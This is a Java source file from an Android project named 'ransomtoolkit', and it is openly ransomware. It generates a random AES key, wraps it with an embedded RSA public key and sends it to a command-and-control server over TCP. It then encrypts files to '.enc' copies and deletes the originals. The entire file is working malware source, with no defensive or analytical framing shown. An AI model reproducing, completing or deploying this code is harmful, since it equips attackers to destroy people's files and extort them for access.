package com.asef18766.ransomtoolkit;

import static javax.crypto.Cipher.ENCRYPT_MODE;

import android.util.Base64;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.X509EncodedKeySpec;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class FileUtils {
    public static String DEBUG_PREFIX = "RansomToolkit";
    private final int BLK_BIT_SZ = 256;
    private final int BLK_BYTE_SZ = BLK_BIT_SZ / 8;

    private static FileUtils _instance = null;

    private Cipher encryptFunc = null;

    private static String pk =
            "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAuvjRlTIieZ7io+PrFJKw\n" +
            "zIaqMyqBuDSu6hMopVO/+3HqLPWq8zyVwIKqzGyGTnYD6vhlsXpjLhy9ovxjSAOg\n" +
            "ZWv4kSCpL0zchzEkeHOHDfTQk2hjZeRKPjwDtpjAdLeifiwvvU1rduZ9cSeOXRUr\n" +
            "oppKwjcJzce+raftn34f0Kbc+Xcual2l6OFEUypgozVvMXJ1hvX5KfD3Bk3sAC1I\n" +
            "OP0FT7pfI0ZepTGLxvXeBoxMe3TCQ0aiRjqu3Z4rVxY8MBONdya9cXqqc1H9aUHz\n" +
            "ksv0LB1CQmQB222bsAHeT+iqBJiQa8aOJzXaXBZzglh/jxQOsGJYRJoO346Bakne\n" +
            "RzE377YDjYWfgC9t8o4s7uDl/4AeDLp4qWKSDuIlRM5Bx0IwA3g51WxEk9L0pCRH\n" +
            "GggsaVc/b3BMSnZnOVj9pbKRHuOONFSbW7QPCY6+c5UbbOROml70FU3TtPktspAq\n" +
            "gqHytRppoXTmzxbgwGf0BFy5WxIgbLX/XhfAuKUR8192Q8NxdYqHudbKCL/Kz1z/\n" +
            "Oet8iT5Pb5JFsc1hP6ReS9Aqz9aw7Tq9IgHuWc3oSUo14XOPtHL/hg1pV1uEXice\n" +
            "y/Y/X62XxMXBsoi+kGUA9HrXB3hszr4v+2ywiRPm8eZxsNNU+IijdwTc57I6oda6\n" +
            "YmguuVRvRdeEEZLhUgmogkECAwEAAQ==";

    private static byte[] RSAEncrypted(byte[] data) throws NoSuchAlgorithmException, InvalidKeySpecException, NoSuchPaddingException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {
        byte[] buffer = Base64.decode(pk, Base64.DEFAULT);

        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        X509EncodedKeySpec keySpec = new X509EncodedKeySpec(buffer);

        PublicKey publicKey = keyFactory.generatePublic(keySpec);

        Cipher cipher = Cipher.getInstance("RSA");
        cipher.init(Cipher.ENCRYPT_MODE, publicKey);
        return cipher.doFinal(data);
    }
    public static void main(String[] args)
    {
        try {
            FileUtils.GetInstance();
        } catch (InvalidAlgorithmParameterException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
        } catch (InvalidKeySpecException e) {
            e.printStackTrace();
        } catch (BadPaddingException e) {
            e.printStackTrace();
        }
    }

    private void SendC2Key(byte[] iv, byte[] key) throws NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, InvalidKeySpecException, BadPaddingException, InvalidKeyException {
        Misc.LogInfo(DEBUG_PREFIX, String.format("aes key:%s", Misc.bytesToHex(key)));
        Misc.LogInfo("f utils", "trying to send aes key");
        byte[] data = String.format("%s|%s", Misc.bytesToHex(iv), Misc.bytesToHex(key)).getBytes(StandardCharsets.UTF_8);
        TcpClient.GetInstance(null).sendMessage(Misc.bytesToHex(RSAEncrypted(data)));
    }
    private FileUtils() throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidAlgorithmParameterException, InvalidKeyException, IllegalBlockSizeException, InvalidKeySpecException, BadPaddingException {
        SecureRandom rng = new SecureRandom();

        byte[] key = new byte[256 / 8];
        rng.nextBytes(key);
        byte[] iv = new byte[16];
        rng.nextBytes(iv);

        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        IvParameterSpec ivParameterSpec = new IvParameterSpec(iv);
        encryptFunc = Cipher.getInstance("AES/CBC/PKCS5Padding");
        encryptFunc.init(ENCRYPT_MODE, keySpec,ivParameterSpec);

        SendC2Key(encryptFunc.getIV(), keySpec.getEncoded());
        keySpec = null;
        System.gc();

        try {
            Misc.LogWarning("crypto", Misc.bytesToHex(encryptFunc.doFinal(new byte[]{4, 8, 7, 6, 33})));
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static FileUtils GetInstance() throws InvalidAlgorithmParameterException, NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, InvalidKeySpecException, BadPaddingException {
        if (_instance == null)
            _instance = new FileUtils();
        return  _instance;
    }
    public void EncryptFile(File file) throws IOException {
        // Here you read the cleartext.
        FileInputStream fis = new FileInputStream(file);
        // This stream write the encrypted text. This stream will be wrapped by another stream.
        FileOutputStream fos = new FileOutputStream(file.getAbsoluteFile() + ".enc");

        // Wrap the output stream
        CipherOutputStream cos = new CipherOutputStream(fos, encryptFunc);
        // Write bytes
        int b;
        byte[] d = new byte[8];
        while((b = fis.read(d)) != -1) {
            cos.write(d, 0, b);
        }
        // Flush and close streams.
        fis.close();
        file.delete();

        cos.flush();
        cos.close();
    }
}